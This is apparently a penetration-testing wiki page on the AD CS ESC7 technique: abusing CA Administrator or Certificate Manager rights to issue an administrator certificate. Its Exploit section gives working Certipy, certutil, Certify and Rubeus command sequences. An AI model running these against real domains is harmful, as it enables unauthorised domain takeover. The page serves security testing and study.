# ESC7

{% hint style="info" %}
Poor access control on roles on CA authority like "CA Administrator" and "Certificate Manager"
{% endhint %}

## Why It Works

* Two distinct CA-level roles can be delegated: **Manage CA** (CA Administrator) and **Manage Certificates** (Certificate Manager/Officer). If a low-priv principal is granted either, they gain control over the CA's issuance policy rather than any single template.
* **Manage CA** rights let the attacker enable `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA (turning the situation into ESC6), or re-enable a disabled/vulnerable template.
* **Manage Certificates** rights let the attacker **approve their own pending certificate requests**. Some templates require CA manager approval before issuance ("Issuance Requirements" -> "CA certificate manager approval"); this control exists specifically to add human review, but if the attacker *is* a certificate manager, they can request a cert as themselves (e.g. specifying an admin SAN via a separately-vulnerable template) and then approve it themselves, bypassing the approval requirement entirely.
* This is a **role/permission compromise**, not a template misconfiguration - it grants primitives that can enable or amplify ESC1/ESC6-style attacks.

## Prerequisites

* `Manage CA` and/or `Manage Certificates` security role assigned to a principal you control (check via the CA's Security tab, or Certipy's CA output).

## Enumerate

```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
## Look for 'CA Configuration' -> 'Access Rights' -> 'ManageCA'/'ManageCertificates' held by controlled principals
```

## Exploit

{% tabs %}
{% tab title="Certipy" %}
```bash
## Option A - Manage CA: enable ESC6-style arbitrary SAN
certipy ca -u <user>@<domain> -p <password> -dc-ip <DC-IP> -ca <CA-Name> -enable-template <template-name>

## Option B - Manage Certificates: request then self-approve a pending cert request
certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -template <manager-approval-required-template> -upn administrator@<domain>
## Note the Request ID returned as 'pending'
certipy ca -u <user>@<domain> -p <password> -dc-ip <DC-IP> -ca <CA-Name> -issue-request <request-id>
certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -retrieve <request-id>
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```
{% endtab %}

{% tab title="certutil + Certify + Rubeus" %}
```bat
REM Option A - Manage CA: enable arbitrary SAN CA-wide (ESC6-style)
certutil -config "<CA-ServerDomain>\<CA-Name>" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
REM Restart the CertSvc service for the change to take effect (requires ManageCA, not full admin)
sc \\<CA-ServerDomain> stop CertSvc
sc \\<CA-ServerDomain> start CertSvc
Certify.exe request /ca:<CA-ServerDomain>\<CA-Username> /template:<any-client-auth-template> /altname:administrator

REM Option B - Manage Certificates: submit then self-approve a pending request
Certify.exe request /ca:<CA-ServerDomain>\<CA-Username> /template:<manager-approval-required-template> /altname:administrator
REM Note the returned Request ID, then approve it as Certificate Manager
certutil -config "<CA-ServerDomain>\<CA-Name>" -resubmit <request-id>
Certify.exe download /ca:<CA-ServerDomain>\<CA-Username> /id:<request-id>

openssl.exe pkcs12 -in esc7.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc7.pfx
Rubeus.exe asktgt /user:administrator /certificate:esc7.pfx /ptt
```
{% endtab %}
{% endtabs %}
